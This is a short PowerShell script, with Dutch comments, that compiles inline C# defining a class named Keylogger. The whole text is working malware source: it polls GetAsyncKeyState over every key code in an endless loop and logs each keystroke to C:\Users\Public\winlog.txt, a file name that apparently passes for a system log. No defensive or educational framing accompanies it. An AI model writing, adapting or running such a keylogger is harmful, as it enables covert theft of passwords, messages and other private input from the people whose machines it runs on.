$logPath = "C:\\Users\\Public\\winlog.txt"  # Gebruik dubbele backslashes

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
public class Keylogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int vKey);
    public static void Main() {
        string filePath = "C:\\Users\\Public\\winlog.txt";  // Dubbele backslashes!
        while (true) {
            for (int i = 0; i < 255; i++) {
                if (GetAsyncKeyState(i) != 0) {
                    File.AppendAllText(filePath, ((ConsoleKey)i).ToString());
                }
            }
        }
    }
}
"@ -Language CSharp
